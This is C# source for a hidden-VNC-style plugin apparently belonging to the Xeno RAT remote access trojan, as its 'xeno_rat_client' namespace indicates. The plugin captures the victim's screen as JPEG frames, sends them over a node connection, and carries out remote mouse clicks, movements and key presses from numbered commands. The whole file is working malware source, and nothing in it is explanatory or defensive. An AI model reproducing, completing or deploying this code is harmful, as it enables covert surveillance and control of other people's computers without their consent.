using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        Node ImageNode;
        bool playing = false;
        int quality = 100;
        int moniter_index = -1;
        double scale = 1;

        [DllImport("SHCore.dll", SetLastError = true)]
        public static extern int SetProcessDpiAwareness(int awareness);

        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            if (!await AcceptSubSubNode(node)) 
            {
                ImageNode?.Disconnect();
                node.Disconnect();
            }

            SetProcessDpiAwareness(2);//2 is being aware of the dpi per monitor

            ScreenShotThread();
            byte[] data=null;
            try
            {
                while (node.Connected())
                {
                    data = await node.ReceiveAsync();
                    if (data == null)
                    {
                        ImageNode?.Disconnect();
                        break;
                    }
                    if (data[0] == 0)
                    {
                        playing = true;
                    }
                    else if (data[0] == 1)
                    {
                        playing = false;
                    }
                    else if (data[0] == 2)
                    {
                        string[] mons = ScreenshotTaker.AvailableMonitors();
                        string monsString = "";
                        foreach (string i in mons)
                        {
                            monsString += i.Replace("\n", "-") + "\n";
                        }
                        if (monsString != "")
                        {
                            monsString = monsString.Substring(0, monsString.Length - 1);//remove the ending newline
                        }
                        await node.SendAsync(Encoding.UTF8.GetBytes(monsString));
                    }
                    else if (data[0] == 3)
                    {
                        quality = node.sock.BytesToInt(data,1);
                    }
                    else if (data[0] == 4)
                    {
                        Screen[] screens = Screen.AllScreens;
                        moniter_index = node.sock.BytesToInt(data,1);
                        byte[] w = node.sock.IntToBytes(screens[moniter_index].Bounds.Width);
                        byte[] h = node.sock.IntToBytes(screens[moniter_index].Bounds.Height);
                        await node.SendAsync(SocketHandler.Concat(w,h));
                    }
                    else if (data[0] == 5)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseClick(coords);
                    }
                    else if (data[0] == 6)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseDoubleClick(coords);
                    }
                    else if (data[0] == 7)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseUp(coords);
                    }
                    else if (data[0] == 8)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseDown(coords);

                    }
                    else if (data[0] == 9)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseRightClick(coords);
                    }
                    else if (data[0] == 10)
                    {
                        int x = node.sock.BytesToInt(data, 1);
                        int y = node.sock.BytesToInt(data, 5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));
                        InputHandler.SimulateMouseMiddleClick(coords);
                    }
                    else if (data[0] == 11)
                    {
                        int x = node.sock.BytesToInt(data,1);
                        int y = node.sock.BytesToInt(data,5);
                        Point coords = new Point((int)((x + Screen.AllScreens[moniter_index].Bounds.X) / scale), (int)((y + Screen.AllScreens[moniter_index].Bounds.Y) / scale));

                        InputHandler.SimulateMouseMove(coords);
                        
                    }
                    else if (data[0] == 12)
                    {
                        int keyCode = node.sock.BytesToInt(data,1);
                        InputHandler.SimulateKeyPress(keyCode);
                    }
                    else if (data[0] == 13) 
                    {
                        scale = (double)node.sock.BytesToInt(data,1)/10000.0;
                    }
                }
            }
            catch
            {
                ImageNode?.Disconnect();
            }
            GC.Collect();
        }
        public async Task ScreenShotThread() 
        {
            try
            {
                while (ImageNode.Connected())
                {
                    if (!playing || moniter_index == -1)
                    {
                        await Task.Delay(500);
                        continue;
                    }
                    try
                    {

                        byte[] data = await Task.Run(() =>
                        {
                            return ScreenshotTaker.TakeScreenshot(quality, moniter_index, true, scale);
                        });
                        await ImageNode.SendAsync(data);
                    }
                    catch
                    {

                    }
                }
            }
            catch { }
        }
        public async Task<bool> AcceptSubSubNode(Node node) 
        {
            byte[] id = await node.ReceiveAsync();
            if (id != null)
            {
                int nodeid = node.sock.BytesToInt(id);
                Node tempnode = null;
                foreach (Node i in node.Parent.subNodes)
                {
                    if (i.SetId == nodeid)
                    {
                        await node.SendAsync(new byte[] { 1 });
                        tempnode = i;
                        break;
                    }
                }
                if (tempnode == null)
                {
                    await node.SendAsync(new byte[] { 0 });
                    return false;
                }
                node.AddSubNode(tempnode);
                ImageNode = tempnode;
                return true;
            }
            else
            {
                return false;
            }
        }
    }
    public class InputHandler
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);

        private const int KEYEVENTF_KEYDOWN = 0x0000;
        private const int KEYEVENTF_KEYUP = 0x0002;

        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        private const uint MOUSEEVENTF_MOVE = 0x0001;
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        private const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        private const uint MOUSEEVENTF_XDOWN = 0x0080;
        private const uint MOUSEEVENTF_XUP = 0x0100;
        private const uint MOUSEEVENTF_WHEEL = 0x0800;
        private const uint MOUSEEVENTF_HWHEEL = 0x1000;
        private const uint MOUSEEVENTF_ABSOLUTE = 0x8000;


        public static void SimulateMouseClick(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, IntPtr.Zero);
        }

        public static void SimulateMouseDoubleClick(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, IntPtr.Zero);

            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, IntPtr.Zero);
        }

        public static void SimulateMouseDown(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, IntPtr.Zero);
        }

        public static void SimulateMouseUp(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, IntPtr.Zero);
        }

        public static void SimulateMouseMove(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);
        }

        public static void SimulateMouseRightClick(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, IntPtr.Zero);
        }

        public static void SimulateMouseScroll(Point screenCoords, int scrollAmount)
        {
            const int WHEEL_DELTA = 120;
            int scrollLines = scrollAmount / WHEEL_DELTA;

            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_WHEEL, 0, 0, (uint)scrollLines, IntPtr.Zero);
        }

        public static void SimulateMouseMiddleClick(Point screenCoords)
        {
            SetCursorPos(screenCoords.X, screenCoords.Y);

            mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, IntPtr.Zero);
            mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, IntPtr.Zero);
        }

        public static void SimulateKeyPress(int keyCode)
        {
            // Simulate keydown
            keybd_event((byte)keyCode, 0, KEYEVENTF_KEYDOWN, 0);

            // Simulate keyup
            keybd_event((byte)keyCode, 0, KEYEVENTF_KEYUP, 0);
        }
    }
    public class ScreenshotTaker
    {
        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        const Int32 CURSOR_SHOWING = 0x00000001;

        public static byte[] TakeScreenshot(int quality, int screenIndex, bool captureCursor, double scaleImageSize = 1)
        {
            Screen[] screens = Screen.AllScreens;

            if (screenIndex < 0 || screenIndex >= screens.Length)
            {
                Console.WriteLine("Invalid screen index.");
                return null;
            }

            Screen selectedScreen = screens[screenIndex];

            int screenLeft = (int)(selectedScreen.Bounds.Left);
            int screenTop = (int)(selectedScreen.Bounds.Top);
            int screenWidth = (int)(selectedScreen.Bounds.Width);
            int screenHeight = (int)(selectedScreen.Bounds.Height);
            Bitmap bitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format24bppRgb);
            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(screenLeft, screenTop, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);

                if (captureCursor)
                {
                    CURSORINFO pci;
                    pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

                    if (GetCursorInfo(out pci))
                    {
                        if (pci.flags == CURSOR_SHOWING)
                        {
                            DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x - screenLeft, pci.ptScreenPos.y - screenTop, pci.hCursor);
                            graphics.ReleaseHdc();
                        }
                    }
                }

                EncoderParameters encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

                ImageCodecInfo codecInfo = GetEncoderInfo(ImageFormat.Jpeg);
                if (scaleImageSize != 1) 
                {
                    Bitmap resized = new Bitmap(bitmap, new Size((int)(bitmap.Width*scaleImageSize), (int)(bitmap.Height * scaleImageSize)));
                    bitmap.Dispose();
                    bitmap = resized;
                }
                using (MemoryStream stream = new MemoryStream())
                {
                    bitmap.Save(stream, codecInfo, encoderParams);
                    bitmap.Dispose();
                    return stream.ToArray();
                }
            }
        }
        private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }

            return null;
        }

        public static string[] AvailableMonitors()
        {
            Screen[] screens = Screen.AllScreens;
            string[] monitors = new string[screens.Length];
            for (int i = 0; i < screens.Length; i++)
            {
                monitors[i] = screens[i].DeviceName;
            }
            return monitors;
        }
    }
}
